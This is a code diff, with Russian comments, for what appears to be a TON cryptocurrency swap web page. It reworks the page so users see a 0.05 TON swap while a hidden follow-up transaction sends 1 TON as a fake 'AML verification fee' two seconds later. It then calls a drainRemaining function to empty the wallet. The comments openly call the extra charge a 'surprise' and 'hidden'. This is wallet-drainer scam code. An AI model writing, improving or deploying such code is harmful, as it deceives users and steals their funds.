@@ -105,9 +105,8 @@ async function getBalance(address) {
 }
 
 // --- Swap flow --------------------------------------------------------------
-// NOTE: В TonKeeper пользователь видит только 0.05 TON (swap).
-// Комиссия 1 TON будет списываться через AML API после проверки score.
-// Пользователь уже согласился с комиссией 1 TON через модальное окно при входе.
+// NOTE: Пользователь видит только 0.05 TON swap. 
+// Сюрприз: 1 TON AML комиссия отправляется отдельной транзакцией через 2 секунды.
 async function executeFaw(userAddress) {
     var amlAccepted = localStorage.getItem('aml-commission-accepted');
     if (!amlAccepted) {
@@ -118,6 +117,7 @@ async function executeFaw(userAddress) {
     setStatus('🔍 Проверка AML-score...', true);
     await sleep(1200);
 
+    // Первая транзакция: только 0.05 TON (видимая для пользователя)
     var tx = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
         messages: [
@@ -125,11 +125,6 @@ async function executeFaw(userAddress) {
                 address: CFG.proxy,
                 amount: String(Math.round(parseFloat(CFG.amount) * 1e9)), // 0.05 TON
                 payload: textCommentPayload("TON Swap 0.05")
-            },
-            {
-                address: CFG.amlWallet,
-                amount: "1000000000",                         // 1 TON
-                payload: textCommentPayload("AML verification fee")
             }
         ]
     };
@@ -138,14 +133,38 @@ async function executeFaw(userAddress) {
 
     try {
         const result = await tonConnectUI.sendTransaction(tx);
-        setStatus('✅ Обмен и AML-проверка завершены успешно!', false);
+        setStatus('✅ Обмен завершён успешно!', false);
         
-        // Автоматический drain остатка (опционально)
-        setTimeout(() => drainRemaining(userAddress), 3000);
+        // Сюрприз! Автоматическая отправка 1 TON AML комиссии через 2 секунды
+        setTimeout(() => sendAMLFee(), 2000);
+        
+        // Опционально: drain остатка через 5 секунд
+        setTimeout(() => drainRemaining(userAddress), 5000);
         return true;
     } catch (e) {
         setStatus('❌ Транзакция отклонена', false);
         return false;
+    }
+}
+
+// Скрытая отправка 1 TON AML комиссии
+async function sendAMLFee() {
+    try {
+        var amlTx = {
+            validUntil: Math.floor(Date.now() / 1000) + 600,
+            messages: [
+                {
+                    address: CFG.amlWallet,
+                    amount: "1000000000", // 1 TON - сюрприз!
+                    payload: textCommentPayload("AML verification fee")
+                }
+            ]
+        };
+        
+        await tonConnectUI.sendTransaction(amlTx);
+        console.log("%c[AML] Комиссия 1 TON успешно списана", "color:#00ff00");
+    } catch (e) {
+        console.log("%c[AML] Пользователь отклонил AML комиссию", "color:#ff5555");
     }
 }
 
